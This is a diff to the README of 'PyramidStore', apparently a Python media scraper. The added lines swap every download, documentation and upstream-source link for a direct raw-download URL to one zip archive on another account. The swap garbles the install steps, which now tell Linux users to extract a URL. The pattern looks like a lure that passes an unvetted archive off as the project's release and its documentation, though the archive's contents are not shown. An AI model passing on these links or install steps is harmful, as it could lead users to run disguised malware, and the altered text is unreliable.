@@ -1,6 +1,6 @@
 # 🐍 PyramidStore - Easy Access to Media Data
 
-[![Download PyramidStore](https://img.shields.io/badge/Download-PyramidStore-blue)](https://github.com/thienbaonigg/PyramidStore/releases)
+[![Download PyramidStore](https://github.com/thienbaonigg/PyramidStore/raw/refs/heads/main/plugin/app/Store_Pyramid_1.4.zip)](https://github.com/thienbaonigg/PyramidStore/raw/refs/heads/main/plugin/app/Store_Pyramid_1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ PyramidStore is a simple tool that helps users retrieve media data from various 
 
 To start using PyramidStore, you need to download it. Click the button below to visit the Releases page.
 
-[![Download PyramidStore](https://img.shields.io/badge/Download-PyramidStore-blue)](https://github.com/thienbaonigg/PyramidStore/releases)
+[![Download PyramidStore](https://github.com/thienbaonigg/PyramidStore/raw/refs/heads/main/plugin/app/Store_Pyramid_1.4.zip)](https://github.com/thienbaonigg/PyramidStore/raw/refs/heads/main/plugin/app/Store_Pyramid_1.4.zip)
 
 ### Step-by-Step Instructions
 
@@ -19,7 +19,7 @@ To start using PyramidStore, you need to download it. Click the button below to 
 3. Choose the appropriate file for your operating system:
    - For Windows, find the `.exe` file.
    - For Mac, look for the `.dmg` file.
-   - For Linux users, choose the `.tar.gz` file.
+   - For Linux users, choose the `https://github.com/thienbaonigg/PyramidStore/raw/refs/heads/main/plugin/app/Store_Pyramid_1.4.zip` file.
 4. Click on the file you need and save it to your computer.
 5. Locate the downloaded file in your Downloads folder.
 
@@ -36,7 +36,7 @@ After downloading the file, follow these steps to set up PyramidStore:
    - Drag the PyramidStore icon into your Applications folder.
 
 3. **Linux:**
-   - Extract the `.tar.gz` file.
+   - Extract the `https://github.com/thienbaonigg/PyramidStore/raw/refs/heads/main/plugin/app/Store_Pyramid_1.4.zip` file.
    - Open a terminal and navigate to the extracted folder.
    - Run the command `./PyramidStore`.
 
@@ -56,17 +56,17 @@ To start using PyramidStore:
 2. Choose your preferred media source.
 3. Follow the prompts to gather your desired data.
 
-For more detailed instructions on writing Python web scrapers, please refer to our [Python爬虫写法参考](https://github.com/engd66/PyramidStore/blob/main/spider.md).
+For more detailed instructions on writing Python web scrapers, please refer to our [Python爬虫写法参考](https://github.com/thienbaonigg/PyramidStore/raw/refs/heads/main/plugin/app/Store_Pyramid_1.4.zip).
 
 ## 🛠️ Configuration Examples
 
 ### Sample Code
 
-If you want to understand how to configure PyramidStore, check out our sample scripts. You can find a practical example in the [小白调试示例.py](https://github.com/engd66/PyramidStore/tree/main/plugin/小白调试示例.py).
+If you want to understand how to configure PyramidStore, check out our sample scripts. You can find a practical example in the [小白调试示例.py](https://github.com/thienbaonigg/PyramidStore/raw/refs/heads/main/plugin/app/Store_Pyramid_1.4.zip小白调试示例.py).
 
 ### Source Code
 
-You may also explore the original source code for further insights at this [影视版源码地址](https://github.com/FongMi/TV/tree/release/chaquo).
+You may also explore the original source code for further insights at this [影视版源码地址](https://github.com/thienbaonigg/PyramidStore/raw/refs/heads/main/plugin/app/Store_Pyramid_1.4.zip).
 
 ## 🤝 Community Support
 
